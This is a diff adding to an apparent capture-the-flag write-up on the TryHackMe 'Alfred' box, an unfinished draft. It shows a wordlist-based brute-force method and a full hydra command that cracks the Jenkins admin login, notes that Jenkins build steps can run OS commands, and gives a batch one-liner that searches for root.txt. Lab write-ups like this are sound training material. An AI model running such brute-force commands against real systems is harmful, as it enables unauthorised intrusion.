@@ -113,10 +113,72 @@ http://10.201.11.17:8080 [403 Forbidden] Cookies[JSESSIONID.ee8d63dc], Country[R
 http://10.201.11.17:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.ee8d63dc], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(9.4.z-SNAPSHOT)], HttpOnly[JSESSIONID.ee8d63dc], IP[10.201.11.17], Jenkins[2.190.1], Jetty[9.4.z-SNAPSHOT], PasswordField[j_password], Script[text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
 ```
 
+![Webserver software versions](/assets/img/ctf/thm/easy/alfred/4.png)
+
 There are two web technologies that stand out:
 * Jenkins[2.190.1]
 * Jetty[9.4.z-SNAPSHOT]
 
+*Jetty* had a potential exploit. I didn't see anything for *Jenkins* from an inital seachsploit query.
+
+```bash
+┌──(haunter㉿kali)-[~/working/thm/easy/Alfred]                  
+└─$ searchsploit jetty 9
+-------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                            |  Path                          
+-------------------------------------------------------------------------- ---------------------------------
+...
+Jetty 9.4.37.v20210219 - Information Disclosure                           | java/webapps/50438.txt
+```
+
+Fruitless. Had to try to bruteforce after all...
+
+Earlier I mentioned that Jenkins has a default *admin* account, but the password needs to be set at setup or is set to a random value. I tried brute forcing with the *alfred* and *bruce* usernames, but I did not get a hit. I then tried the *admin* user.
+
+When bruteforcing, this is my methodology:
+
+* known usernames with known passwords list (e.g. user 'alfred' and 'discovered_passwords.txt')
+* username:username
+* popular default passwords (e.g. 'password', 'password123', '123456', etc)
+* /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
+* /usr/share/wordlists/rockyou.
+
+I run the 10-million-password-list-top-10000.txt if needed first as it's a smaller list compared to rockyou. Once that's been exhaused, I then run rockyou.txt.
+
+```bash
+┌──(haunter㉿kali)-[~/working/thm/easy/Alfred]
+└─$ hydra -f -s 8080 -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt $alfred http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+in:Invalid username or password" -t 15 
+...
+[8080][http-post-form] host: 10.201.31.54   login: admin   password: admin
+```
+
+We got a password "admin:admin". I want to slap myself >:(
+
+
+![Jenkins Dashboard](/assets/img/ctf/thm/easy/alfred/5.png)
+
+In any case I got into the Jenkins Dashboard. Just like when first assessing a webapp prior to logging into it, I'll walk the app first to enumerate any interesting features now that we have access. 
+
+Diving into *Build History* reveals something interesting:
+
+![Build history](/assets/img/ctf/thm/easy/alfred/6.png)
+
+I investigated the project listed.
+
+Command console icon == webshell potentially? Worth exploration. 
+
+![Configuration](/assets/img/ctf/thm/easy/alfred/7.png)
+
+Walked this project tab by tab.
+
+![Windows batch command](/assets/img/ctf/thm/easy/alfred/8.png)
+
+Jackpot. Configure has a 'Windows batch command' section under *Build*. It looks like we can issue commands directly to the OS.
+
+```powershell
+
+
+```
 
 
 ## Foothold
@@ -126,6 +188,12 @@ There are two web technologies that stand out:
 ## Lateral Movement / Privilege Escalation
 
 ## Root / SYSTEM
+
+```powershell
+# look for a specific file and stop if the file is found
+for /r C:\ %f in (root.txt) do @if exist "%f" (echo %f & goto :found)
+```
+
 
 # Lessons Learned
 
